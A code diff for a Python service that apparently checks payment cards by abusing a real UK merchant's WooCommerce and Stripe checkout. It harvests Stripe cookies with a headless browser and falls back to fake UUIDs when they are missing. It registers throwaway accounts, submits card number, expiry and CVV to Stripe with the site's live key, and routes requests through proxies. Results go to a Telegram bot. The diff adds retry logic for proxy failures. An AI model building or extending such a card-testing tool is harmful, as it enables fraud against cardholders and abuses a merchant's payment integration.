@@ -10,7 +10,6 @@ from pydantic import BaseModel
 import uvicorn
 from playwright.async_api import async_playwright
 
-# Initialize FastAPI app
 app = FastAPI()
 
 # --- Environment Variables ---
@@ -48,7 +47,6 @@ async def get_stripe_ids_and_cookies():
     async with async_playwright() as p:
         browser = await p.chromium.launch(headless=True)
         page = await browser.new_page()
-
         async def log_stripe_responses(response):
             if "stripe.com/v1/elements/sessions" in response.url:
                 try:
@@ -56,20 +54,14 @@ async def get_stripe_ids_and_cookies():
                     ids["elements_session_config_id"] = body.get("config_id")
                 except Exception:
                     pass
-
         page.on("response", log_stripe_responses)
         await page.goto("https://www.georgedaviesturf.co.uk/my-account/add-payment-method/")
-        await page.wait_for_timeout(10000)  # Wait for Stripe JS and cookies
-
-        # Get Stripe cookies (__stripe_mid, __stripe_sid, __stripe_muid)
+        await page.wait_for_timeout(10000)
         cookies = await page.context.cookies()
         for cookie in cookies:
             if "stripe" in cookie["name"]:
                 ids[cookie["name"]] = cookie["value"]
-
         await browser.close()
-
-    # Fallback to random UUIDs if missing
     for k in ["__stripe_mid", "__stripe_sid", "__stripe_muid"]:
         if k not in ids:
             ids[k] = str(uuid.uuid4())
@@ -105,10 +97,28 @@ async def make_request(
             if logs is not None:
                 logs.append(f"Step: {step_name}\nURL: {url}\nStatus: {response.status}\nResponse:\n{resp_text}\n")
             return resp_text
+    except (aiohttp.ClientProxyConnectionError, aiohttp.ClientConnectorError) as e:
+        if logs is not None:
+            logs.append(f"Step: {step_name}\nURL: {url}\nProxy Error: {e}\n")
+        raise
     except Exception as e:
         if logs is not None:
             logs.append(f"Step: {step_name}\nURL: {url}\nError: {e}\n")
-        return f"Error: {e}"
+        raise
+
+async def retry_request(*args, **kwargs):
+    max_retries = 3
+    for attempt in range(1, max_retries+1):
+        try:
+            return await make_request(*args, **kwargs)
+        except (aiohttp.ClientProxyConnectionError, aiohttp.ClientConnectorError) as e:
+            print(f"Proxy error on attempt {attempt}: {e} - Retrying...")
+            await asyncio.sleep(2)
+            continue
+        except Exception as e:
+            print(f"Non-proxy error: {e}")
+            raise
+    raise RuntimeError("All proxy retries failed for request.")
 
 async def send_telegram_message(message):
     api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -145,7 +155,6 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
     proxy_auth_obj = aiohttp.BasicAuth(PROXY_USERNAME, PROXY_PASSWORD) if PROXY_USERNAME and PROXY_PASSWORD else None
     connector = aiohttp.TCPConnector(ssl=False)
 
-    # --- Get Stripe Real IDs & Cookies from browser ---
     ids = await get_stripe_ids_and_cookies()
     guid = ids['__stripe_mid']
     sid = ids['__stripe_sid']
@@ -173,7 +182,7 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
         }
         
         try:
-            req1_text = await make_request(
+            req1_text = await retry_request(
                 my_session,
                 url="https://www.georgedaviesturf.co.uk/my-account",
                 method="GET",
@@ -218,7 +227,7 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
                 "_wp_http_referer": "/my-account/",
                 "register": "Register",
             }
-            req2_text = await make_request(
+            req2_text = await retry_request(
                 my_session,
                 "https://www.georgedaviesturf.co.uk/my-account/",
                 headers=headers2,
@@ -230,7 +239,7 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
             )
             await asyncio.sleep(1)
 
-            req3_text = await make_request(
+            req3_text = await retry_request(
                 my_session,
                 url="https://www.georgedaviesturf.co.uk/my-account/add-payment-method/",
                 method="GET",
@@ -291,7 +300,7 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
                 "key": "pk_live_51OCKXEAPMeRp4YIca4hWzwyYQnAllzcTDlBQ76zKfkErhZEyh5aOPCLixfOnAt1oV31EfTX2CGTu40JVnrLvQL7r0078s5MPx5",
                 "_stripe_version": "2024-06-20",
             }
-            req4_text = await make_request(
+            req4_text = await retry_request(
                 my_session,
                 url="https://api.stripe.com/v1/payment_methods",
                 headers=headers4,
@@ -331,7 +340,7 @@ async def stripe_auth_logic(cc: str, mon: str, year: str, cvv: str):
                 "wc-stripe-payment-type": "card",
                 "_ajax_nonce": rest_nonce,
             }
-            req5_text = await make_request(
+            req5_text = await retry_request(
                 my_session,
                 url="https://www.georgedaviesturf.co.uk/wp-admin/admin-ajax.php",
                 headers=headers5,
